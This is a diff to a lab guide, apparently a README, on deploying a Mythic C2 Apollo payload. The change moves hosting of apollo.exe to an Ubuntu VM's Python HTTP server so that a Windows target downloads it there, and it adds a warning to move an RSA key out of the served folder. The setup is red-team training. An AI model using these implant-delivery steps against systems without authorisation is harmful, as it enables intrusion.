@@ -300,7 +300,14 @@ Click **Next** :
 
 8. Click **Create Payload**. Mythic builds the payload in Docker on the EC2 instance. When it finishes, click **Download** — the file will be named something like `apollo.exe`. Your browser downloads it directly from the EC2 server.
 
-Transfer `apollo.exe` to your Windows target machine. You can host it from the EC2 instance:
+- Note your Ubuntu IP. You can find it in the terminal : 
+
+<img width="680" height="89" alt="image" src="https://github.com/user-attachments/assets/7cc699de-e6c9-4aab-ae00-964922b716ca" />
+
+- Transfer `apollo.exe` to your Windows target machine. You can host it from the **Ubuntu VM**:
+
+>[!IMPORTANT]
+> If your **RSA Key** is in the downloads folder on the Ubuntu VM, move it to any other folder.
 
 ```bash
 cd ~/Downloads
@@ -310,7 +317,7 @@ python3 -m http.server 8080
 Then on the Windows machine, open a browser and go to:
  
 ```
-http://<EC2_PUBLIC_IP>:8080/apollo.exe
+http://<UBUNTU_IP>:8080/apollo.exe
 ```
  
 Download and save the file.
